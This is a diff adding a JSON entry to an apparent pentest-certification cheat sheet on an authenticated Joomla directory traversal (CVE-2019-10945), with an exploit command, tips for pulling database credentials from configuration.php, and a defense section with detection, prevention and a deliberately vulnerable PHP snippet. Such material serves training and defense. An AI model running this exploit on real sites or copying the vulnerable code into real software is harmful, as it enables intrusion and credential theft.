@@ -1,0 +1,84 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access",
+    "credentials"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "python",
+    "joomla"
+  ],
+  "tags": [
+    "joomla",
+    "directory-traversal",
+    "lfi",
+    "cve-2019-10945"
+  ],
+  "category": "Exploitation",
+  "subcategory": "Joomla",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Authenticated directory traversal to list/read arbitrary paths",
+      "command": "python2.7 joomla_dir_trav.py --url \"http://<url>/administrator/\" --username <user> --password <pass> --dir /"
+    }
+  ],
+  "notes": "Needs valid admin creds (pair it with the manager brute-force). Read outside the web root (e.g. --dir / then descend) to pull configuration.php DB creds or system files.",
+  "references": [
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "joomla-bruteforce",
+      "note": "Provides the admin login this exploit needs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "joomla-template-webshell",
+      "note": "Escalate the same admin access to full RCE.",
+      "rel": "alternative"
+    }
+  ],
+  "id": "joomla-dirtrav",
+  "name": "Joomla - Authenticated Directory Traversal (CVE-2019-10945)",
+  "command": "python2.7 joomla_dir_trav.py --url \"http://<url>/administrator/\" --username <user> --password <pass> --dir /",
+  "description": "Authenticated directory-traversal in the Joomla Media Manager (CVE-2019-10945) that lists and reads files outside the web root using valid admin credentials.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Joomla com_media directory traversal passes a user-controlled path parameter to file-reading functions without normalization, allowing traversal outside the media root to read arbitrary files including configuration.php.",
+    "prerequisites": "Vulnerable Joomla version. HTTP access to the admin panel. Admin credentials for authenticated variants.",
+    "impact": "Read of configuration.php reveals plaintext database credentials enabling direct database access and full site takeover.",
+    "detection": "GET/POST requests containing directory traversal sequences (../../) to Joomla admin endpoints. WAF alert for path traversal patterns.",
+    "artifacts": "Web server access log (traversal sequences in URL parameters) | WAF path traversal alerts",
+    "prevention": "Keep Joomla core and all extensions fully patched. Use realpath() and validate the resolved path starts with the expected base directory. Set open_basedir.",
+    "misconfiguration": "Vulnerable Joomla version processes user-supplied path parameters without realpath() normalization, and open_basedir is not configured.",
+    "vulnerable_config": "// Vulnerable code\n$file = $_GET['path'];\nreadfile('/var/www/html/media/' . $file);  // no realpath() check\n\n// php.ini -- no restriction\n; open_basedir =",
+    "secure_config": "// php.ini\nopen_basedir = /var/www/html\n\n// Secure path check\n$base = realpath('/var/www/html/media');\n$requested = realpath('/var/www/html/media/' . $_GET['path']);\nif (strpos($requested, $base) !== 0) { http_response_code(403); exit; }",
+    "sources": [
+      "HTB M24",
+      "MITRE T1083",
+      "OWASP A05:2021"
+    ]
+  }
+}
